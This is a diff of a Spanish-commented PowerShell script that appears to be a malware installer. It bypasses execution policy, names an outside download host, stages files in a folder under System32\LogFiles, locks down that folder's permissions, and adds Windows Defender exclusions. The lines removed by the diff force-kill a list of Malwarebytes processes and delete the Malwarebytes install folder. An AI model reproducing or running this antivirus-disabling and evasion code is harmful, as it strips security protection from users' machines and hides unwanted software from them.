@@ -15,20 +15,6 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 # URL base para descargas
 $baseURL = "https://baa4ts.is-a-good.dev"
 
-# Lista de nombres de procesos de Malwarebytes
-$mbProcesses = @(
-    "assistant", "ig", "Malwarebytes", "malwarebytes_assistant",
-    "mb5uns", "MBAM", "MbamBgNativeMsg", "MBAMCrashHandler",
-    "MBAMInstallerService", "MbamPt", "MBAMService", "MBAMWsc",
-    "mbuns", "mbupdatrV5", "MBVpnTunnelService", "createdump"
-)
-
-foreach ($procName in $mbProcesses) {
-    Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force
-}
-
-Remove-Item -Path "C:\Program Files\Malwarebytes" -Recurse -Force -Confirm:$false
-
 # Definir rutas
 $root = Join-Path $env:WINDIR "System32"
 $root = Join-Path $root "LogFiles"
@@ -54,6 +40,56 @@ try {
 
     # Agregar exclusiones de Windows Defender
     Write-Host "Agregando exclusiones de Windows Defender..." -ForegroundColor Yellow
+
+    # Cuenta que puede modificar todo (tu software)
+    $serviceAccount = "NT AUTHORITY\SYSTEM"
+    
+    # --- Objetos de seguridad ---
+    $everyone = New-Object System.Security.Principal.NTAccount("Everyone")
+    $serviceAcct = New-Object System.Security.Principal.NTAccount($serviceAccount)
+    
+    # Derechos para Everyone: solo lectura y ejecución
+    $readExecuteRights = [System.Security.AccessControl.FileSystemRights]"ReadAndExecute, Synchronize"
+    
+    # Herencia: contenedores y objetos
+    $inheritance = [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor `
+                   [System.Security.AccessControl.InheritanceFlags]::ObjectInherit
+    
+    $propagation = [System.Security.AccessControl.PropagationFlags]::None
+    
+    # Crear regla para Everyone
+    $allowReadExecute = New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $everyone,
+        $readExecuteRights,
+        $inheritance,
+        $propagation,
+        [System.Security.AccessControl.AccessControlType]::Allow
+    )
+    
+    # Crear regla para el servicio: control total
+    $fullControlRights = [System.Security.AccessControl.FileSystemRights]::FullControl
+    $allowFullControl = New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $serviceAcct,
+        $fullControlRights,
+        $inheritance,
+        $propagation,
+        [System.Security.AccessControl.AccessControlType]::Allow
+    )
+    
+    # Obtener ACL y limpiar reglas conflictivas de Everyone
+    $acl = Get-Acl -Path $root
+    $acl.Access | Where-Object { $_.IdentityReference -eq $everyone } | ForEach-Object {
+        $acl.RemoveAccessRule($_)
+    }
+    
+    # Agregar nuevas reglas
+    $acl.AddAccessRule($allowReadExecute)
+    $acl.AddAccessRule($allowFullControl)
+    
+    # Aplicar ACL
+    Set-Acl -Path $root -AclObject $acl
+    
+    Write-Host "Permisos aplicados correctamente: $serviceAccount puede modificar, Everyone solo lectura/ejecución."
     
     # Verificar si el módulo de Defender está disponible
     if (Get-Module -ListAvailable -Name Defender) {
